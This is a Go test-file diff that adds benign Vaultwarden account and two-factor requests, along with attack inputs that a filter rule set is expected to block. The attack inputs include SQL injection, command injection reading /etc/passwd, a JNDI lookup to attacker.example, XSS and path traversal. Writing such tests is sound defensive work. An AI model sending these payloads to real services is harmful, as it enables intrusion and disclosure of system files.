@@ -2,6 +2,7 @@ package services
 
 import (
 	"context"
+	"encoding/base32"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -171,10 +172,34 @@ func (g vw) requests() []vwRequest {
 		{"POST", "/api/sends/access/" + base64.RawURLEncoding.EncodeToString(g.bytes(16)), js, vwJSON(map[string]any{"password": g.hash()}), ""},
 		{"PUT", "/api/accounts/profile", js, vwJSON(map[string]any{"name": g.pick("Alice Doe", "Jane O'Hara", "Sam"), "culture": "en-US",
 			"masterPasswordHint": g.pick("the usual", "", "blue car + 42")}), ""},
+		{"POST", "/api/accounts/api-key", js, vwJSON(map[string]any{"masterPasswordHash": g.hash()}), ""},
+		{"POST", "/api/accounts/rotate-api-key", js, vwJSON(map[string]any{"masterPasswordHash": g.hash()}), ""},
+		{"POST", "/api/accounts/rotate-api-key", js, vwJSON(map[string]any{"otp": fmt.Sprintf("%06d", g.r.IntN(1e6))}), ""},
+		{"POST", "/api/accounts/request-otp", "", "", ""},
+		{"POST", "/api/accounts/security-stamp", js, vwJSON(map[string]any{"masterPasswordHash": g.hash()}), ""},
+		{"POST", "/api/accounts/verify-password", js, vwJSON(map[string]any{"masterPasswordHash": g.hash()}), ""},
+		{"POST", "/api/accounts/kdf", js, vwJSON(map[string]any{"kdf": 0, "kdfIterations": 600000, "kdfMemory": nil, "kdfParallelism": nil,
+			"masterPasswordHash": g.hash(), "newMasterPasswordHash": g.hash(), "key": g.enc(64)}), ""},
+		{"POST", "/api/accounts/password", js, vwJSON(map[string]any{"masterPasswordHash": g.hash(), "newMasterPasswordHash": g.hash(),
+			"masterPasswordHint": "", "key": g.enc(64)}), ""},
+		{"POST", "/api/accounts/email-token", js, vwJSON(map[string]any{"newEmail": g.email(), "masterPasswordHash": g.hash()}), ""},
+		{"POST", "/api/accounts/email", js, vwJSON(map[string]any{"newEmail": g.email(), "masterPasswordHash": g.hash(),
+			"newMasterPasswordHash": g.hash(), "token": fmt.Sprintf("%06d", g.r.IntN(1e6)), "key": g.enc(64)}), ""},
+		{"POST", "/api/accounts/password-hint", js, vwJSON(map[string]any{"email": g.email()}), ""},
+		{"POST", "/api/accounts/delete", js, vwJSON(map[string]any{"masterPasswordHash": g.hash()}), ""},
+		{"DELETE", "/api/accounts", js, vwJSON(map[string]any{"masterPasswordHash": g.hash()}), ""},
+		{"POST", "/api/two-factor/get-authenticator", js, vwJSON(map[string]any{"masterPasswordHash": g.hash()}), ""},
+		{"PUT", "/api/two-factor/authenticator", js, vwJSON(map[string]any{"key": base32.StdEncoding.EncodeToString(g.bytes(20)),
+			"token": fmt.Sprintf("%06d", g.r.IntN(1e6)), "masterPasswordHash": g.hash()}), ""},
+		{"POST", "/api/two-factor/get-recover", js, vwJSON(map[string]any{"masterPasswordHash": g.hash()}), ""},
+		{"PUT", "/api/two-factor/disable", js, vwJSON(map[string]any{"type": 0, "masterPasswordHash": g.hash()}), ""},
+		{"POST", "/api/two-factor/send-email", js, vwJSON(map[string]any{"email": g.email(), "masterPasswordHash": g.hash()}), ""},
+		{"PUT", "/api/two-factor/email", js, vwJSON(map[string]any{"email": g.email(), "masterPasswordHash": g.hash(),
+			"token": fmt.Sprintf("%06d", g.r.IntN(1e6))}), ""},
 		{"POST", "/identity/accounts/prelogin", js, vwJSON(map[string]any{"email": g.email()}), ""},
 		{"POST", "/identity/accounts/prelogin/password", js, vwJSON(map[string]any{"email": g.email()}), ""},
 		{"POST", "/identity/connect/token", form, vwForm("scope", "api offline_access", "client_id", g.pick("web", "browser", "mobile"),
-			"deviceType", "10", "deviceIdentifier", g.uuid(), "deviceName", g.pick("firefox", "chrome", "Pixel 8 Pro", "iPhone"),
+			"deviceType", "10", "deviceIdentifier", g.uuid(), "deviceName", g.pick("firefox", "chrome", "Pixel 8 Pro", "moto g(7) play", "SM-S918B", "iPhone"),
 			"grant_type", "password", "username", g.email(), "password", g.hash(),
 			"twoFactorToken", fmt.Sprintf("%06d", g.r.IntN(1e6)), "twoFactorProvider", "0", "twoFactorRemember", "1"), ""},
 		{"POST", "/identity/connect/token", form, vwForm("grant_type", "refresh_token", "client_id", "web",
@@ -296,7 +321,8 @@ func TestTheVaultwardenSetLetsItsClientsThrough(t *testing.T) {
 
 // An attack is refused with the set loaded at every level, whether it is
 // typed where ciphertext belongs, sits among ciphertext that would
-// otherwise pass, or comes in a token, a sign-in or a file's name.
+// otherwise pass, or comes in a token, a sign-in, an account setting or a
+// file's name.
 func TestTheVaultwardenSetKeepsTheAttacks(t *testing.T) {
 	t.Parallel()
 	g := vw{rand.New(rand.NewPCG(7, 7))}
@@ -314,9 +340,18 @@ func TestTheVaultwardenSetKeepsTheAttacks(t *testing.T) {
 			"text": map[string]any{"text": "${jndi:ldap://attacker.example/a}"}}), ""},
 		{"POST", "/api/sends/access/abc", js, vwJSON(map[string]any{"password": "' OR 1=1--"}), ""},
 		{"POST", "/identity/accounts/prelogin", js, vwJSON(map[string]any{"email": "a@b.c' UNION SELECT 1,2--"}), ""},
+		{"POST", "/api/accounts/rotate-api-key", js, vwJSON(map[string]any{"masterPasswordHash": "' OR 1=1--"}), ""},
+		{"PUT", "/api/two-factor/authenticator", js, vwJSON(map[string]any{"key": "; cat /etc/passwd", "token": "123456",
+			"masterPasswordHash": g.hash()}), ""},
 		{"POST", "/identity/connect/token", "application/x-www-form-urlencoded",
 			vwForm("grant_type", "password", "client_id", "web", "username", "admin'--", "password", g.hash(),
 				"scope", "api offline_access", "deviceIdentifier", g.uuid()), ""},
+		{"POST", "/identity/connect/token", "application/x-www-form-urlencoded",
+			vwForm("grant_type", "password", "client_id", "web", "username", g.email(), "password", g.hash(),
+				"scope", "api offline_access", "deviceIdentifier", g.uuid(), "deviceName", "x; cat /etc/passwd"), ""},
+		{"POST", "/identity/connect/token", "application/x-www-form-urlencoded",
+			vwForm("grant_type", "password", "client_id", "web", "username", g.email(), "password", g.hash(),
+				"scope", "api offline_access", "deviceIdentifier", g.uuid(), "deviceName", "1' OR '1'='1"), ""},
 		{"POST", "/identity/connect/token", "application/x-www-form-urlencoded",
 			vwForm("grant_type", "refresh_token", "client_id", "web", "refresh_token", "<svg onload=alert(1)>"), ""},
 		{"GET", "/notifications/hub?access_token=../../../../etc/passwd", "", "", ""},
